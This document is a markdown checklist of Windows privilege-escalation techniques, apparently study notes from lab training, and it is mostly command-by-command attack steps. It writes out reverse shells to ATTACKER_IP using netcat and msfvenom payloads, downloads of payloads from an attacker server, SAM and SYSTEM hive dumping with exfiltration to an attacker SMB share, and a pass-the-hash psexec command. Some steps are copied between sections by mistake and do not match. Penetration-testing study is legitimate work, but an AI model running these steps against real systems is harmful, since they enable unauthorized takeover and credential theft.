# Windows-Privilege-Escalation
Check List Windows Privilege Escalation

### 1- **Scheduled Tasks**

- Scheduled tasks can run programs or scripts automatically. If a task's
executable can be modified by our user, we can insert malicious code for
privilege escalation.
- Steps to exploit:
    - List scheduled tasks:
        - schtasks /query /tn vulntask /fo list /v
        - Look for the Task to Run parameter (shows the executable) and the
        User parameter (shows which user runs the task).
    - Check permissions on the executable:
        - icacls C:\\tasks\\schtask.bat
        - BUILTIN\\Users:(I)(F) is present, the file can be modified.
    - Modify the task's executable:
        - echo C:\\tools\\nc64.exe -e cmd.exe ATTACKER_IP 4444 >
        C:\\tasks\\schtask.bat
    - Start a listener on the attacker machine:
        - nc -lvp 4444
    - Manually trigger the task (if permitted):
        - schtasks /run /tn vulntask
    - Receive the reverse shell:
        - On the attacker's listener:

### 

### 2- **Always Install Elevated**

- Windows `.msi` installer files are used to install programs. Normally, they run with the same permissions as the user who starts them. But some `.msi` files can be set to run with **higher privileges**, even from a low-privilege user.
- **Why is this important?**
    - If misconfigured, an attacker can create a **malicious MSI file** that runs with **admin privileges** , leading to privilege escalation.
- Steps to check and exploit:
    - Check registry values:  Both keys must be enabled for exploitation
        - **`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`**
        - **`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`**
    - If **both** return:
        - `AlwaysInstallElevated    REG_DWORD    0x1`
    - **Generate a Malicious MSI File** (On Kali Linux)
        
        ```
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
        ```
        
    - Transfer the MSI File to the Target
        - `python3 -m http.server 8080`
    - On **Windows**, download the file using PowerShell:
        - `Invoke-WebRequest -Uri "[http://<your-ip>:8080/exploit.msi](http://192.168.1.100:8080/exploit.msi)" -OutFile "**C:\Windows\Temp\malicious.msi**"`
    - Set Up a Netcat Listener on Kali
        - `nc -nvlp 4444`
    - Run the MSI File on Windows (with Admin Privileges)
        - **`C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`**

### **Insecure Permissions on Service Executable**

- If the service's executable has weak permissions, an attacker can replace it
with a malicious file.
    - use tool power up
        - `Import-Module .\PowerUp.ps1`
        - `Set-ExecutionPolicy Bypass -Scope Process -Force`   to Since PowerShell may block scripts, you need to **bypass** execution restrictions:
        - `Invoke-AllChecks`
    - or use manual in power shell to show all service
        - `Get-WmiObject Win32_Service | Select-Object Name, DisplayName, PathName | Format-Table -AutoSize`
    - To check a **specific service**, To understand how this works use :
        - `sc qc service-name`
    - when found the service vuln Check executable permissions: you must find user can write or have all access to this service
        - **`icacls < binary-bath of service >`**
    - make the reverse shell
        - **`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe`**
    - Transfer the MSI File to the Target
        - `python3 -m http.server 8080`
    - On **Windows**, download the file using PowerShell:
        - `Invoke-WebRequest -Uri "[http://<your-ip>:8080/exploit.msi](http://192.168.1.100:8080/exploit.msi)" -OutFile "**C:\Windows\Temp\malicious.msi**"`
    - Set Up a Netcat Listener on Kali
        - `nc -nvlp 4444`

## SeBackup / SeRestore

### Exploitation Steps:

- we can check our privileges with the following command:
    - **`whoami /priv`**
- To backup the SAM and SYSTEM hashes, we can use the following commands:
    - `reg save hklm\\system C:\\Users\\THMBackup\\system.hive`
    - `reg save hklm\\sam C:\\Users\\THMBackup\\sam.hive`
- Transfer hives to the attacker's machine using SMB
    - **`copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\`**
    - **`copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\`**
- And use impacket to retrieve the users' password hashes:
    
    <aside>
    💡
    
    - **python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL**
    </aside>
    
- We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:
    
    <aside>
    💡
    
    - **python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.206.42**
    </aside>
    

## **SeTakeOwnership**

- The **SeTakeOwnership** privilege allows a user to **take ownership of any object** on the system, such as files, folders, registry keys, or services, even if they don’t have permission to access them. This can be abused to gain full control over critical system files and escalate privileges.

### Exploitation Steps:

- check if your user has this privilege.
    - `whoami /Priv`
        - Look for **SeTakeOwnershipPrivilege** in the output. If it is **Enabled**, you can proceed with privilege escalation.
- Find Services with Non-System Paths
    
    <aside>
    💡
    
    - wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\System32\"
    </aside>
    
- Find a Specific Service
    - `sc qc "VulnerableService"`
- Take Ownership of the File
    - `takeown /f "C:\Program Files\VulnerableService\service.exe"`
- Give Yourself Full Control
    - `icacls "C:\Program Files\VulnerableService\service.exe" /grant Everyone:F`
- Replace the Service Executable
    - Backup the Original File:
        - `copy "C:\Program Files\VulnerableService\service.exe" "C:\Backup\service.exe.bak"`
    - Replace the Executable with a Malicious One:
        
        <aside>
        💡
        
        - move C:\Users\Public\reverse-shell.exe "C:\Program Files\VulnerableService\service.exe"
        </aside>
        
- Restart the Service:
    - `sc stop "VulnerableService"`
    - `sc start "VulnerableService"`
- **(Summary)**
    - **Find a vulnerable service** (`wmic service get name,displayname,pathname,startmode`).
    - **Take ownership** of its executable (`takeown /f file.exe`).
    - **Grant yourself full control** (`icacls file.exe /grant Everyone:F`).
    - **Replace the executable** with a **malicious payload**.
    - **Restart the service** to execute your **malicious binary** and get **SYSTEM access**.

## **SeImpersonate / SeAssignPrimaryToken**

### **What Are These Privileges?**

- **SeImpersonate** → Allows a process to impersonate another user and act on their behalf.
- **SeAssignPrimaryToken** → Allows a process to assign a new access token to a newly spawned process.

### Exploitation Steps:

- Check If Your User Has These Privileges:
    - `whoami /Priv`
- Set Up a Netcat Listener on the Attacker's Machine
    - `nc -lvp 4442`
- Exploit Using RogueWinRM
    - `C:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"`
- download RogueWinRM
    - `Invoke-WebRequest -Uri "http://some-url.com/RoguePotato.exe" -OutFile "C:\Users\Public\RoguePotato.exe"`

## **Unpatched software**

### **Unpatched software** refers to applications, operating systems, or services that have not been updated with the latest security patches. Attackers exploit **known vulnerabilities** in outdated software to gain unauthorized access, escalate privileges, or execute malicious code.

Exploitation Steps:

- **Scanning for Vulnerable Systems**
    - `nmap -sV --script=vuln <target-ip>`
- search about the version operating system by searchsploit or metasploit

or can make it manual 

- Identify the software version
    - `wmic product get name,version,vendor`
- searchsploit <software name>

## Token Impersonation - PrintSpoofer

**PrintSpoofer** is a post-exploitation tool used in Windows environments to escalate privileges by exploiting weaknesses in the **Print Spooler service**. It primarily focuses on abusing **SeImpersonatePrivilege** to gain elevated privileges, such as **SYSTEM** or **Administrator**, from a lower-privileged account.

### Exploitation Steps:

- Check if the Target Uses Token Impersonation
    - `whoami /priv`
- Look for this **privilege** in the output:
    - SeImpersonatePrivilege      Enabled
- **Check the Windows Version : PrintSpoofer** works best on Windows 10 and Windows Server 2016/2019.
    - `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`
- Confirm "Local Service" Access
    - `whoami`
- Expected output:
    - nt authority\local service
    - **If your shell runs as "Local Service" and has SeImpersonatePrivilege, you can proceed with PrintSpoofer.**
- Upload `PrintSpoofer.exe` to the Target
    - `python3 -m http.server 8000`
    
    <aside>
    💡
    
    - powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<Kali-IP>:8000/PrintSpoofer.exe', 'C:\PrivEsc\PrintSpoofer.exe')"
    </aside>
    
- Run PrintSpoofer in Interactive Mode
    - `C:\PrivEsc\PrintSpoofer.exe -i -c cmd.exe`

### use automated enumeration to all service , you can use tool like

- windows-privesc-check
- Watson
- sherlock
- powersploit/privesc/powerup  (((((((((((((((((((((

`Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" -OutFile "PowerUp.ps1" powershell -ExecutionPolicy Bypass -File PowerUp.ps1 > powerup_results.txt`                                         ))))))))))))))))))))))))

- windows-exploit-suggester
- jaws
- winpeas.exe and .bat
